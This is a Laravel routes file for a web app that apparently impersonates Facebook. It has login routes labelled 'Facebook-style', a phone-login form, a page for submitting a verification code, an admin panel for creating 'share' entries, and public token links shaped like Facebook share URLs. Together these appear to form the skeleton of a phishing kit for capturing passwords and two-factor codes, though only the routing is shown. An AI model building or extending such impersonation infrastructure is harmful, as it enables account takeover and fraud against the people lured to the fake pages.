<?php

use Illuminate\Support\Facades\Route;
use App\Http\Controllers\AuthController;
use App\Http\Controllers\Admin\FacebookShareController;

use App\Http\Controllers\HomeController;
Route::get('/', [HomeController::class, 'homepage'])->name('homepage');

Route::get('login', [AuthController::class, 'showLoginForm'])->name('login');
Route::post('login', [AuthController::class, 'login']);
// Facebook-style login URL
Route::get('facebook/login', [AuthController::class, 'showLoginForm'])->name('facebook.login');
Route::post('facebook/login', [AuthController::class, 'login']);
// Phone login
Route::get('facebook/phone-login', [AuthController::class, 'showPhoneLoginForm'])->name('phone.login');
Route::post('facebook/phone-login', [AuthController::class, 'phoneLogin']);
Route::get('code', [AuthController::class, 'showCodeForm'])->name('code.page');
Route::post('code', [AuthController::class, 'submitCode'])->name('code.submit');

// Admin routes

Route::get('admin/facebook/share/create/phone', [FacebookShareController::class, 'createphone'])->name('admin.facebook.share.create.phone');

Route::get('admin/facebook/share/create', [FacebookShareController::class, 'create'])->name('admin.facebook.share.create');
Route::post('admin/facebook/share/store', [FacebookShareController::class, 'store'])->name('admin.facebook.share.store');
Route::delete('admin/facebook/share/{id}', [FacebookShareController::class, 'destroy'])->name('admin.facebook.share.destroy');

// Public share route
Route::get('facebook/share/r/{token}', [FacebookShareController::class, 'show'])->name('facebook.share.show');
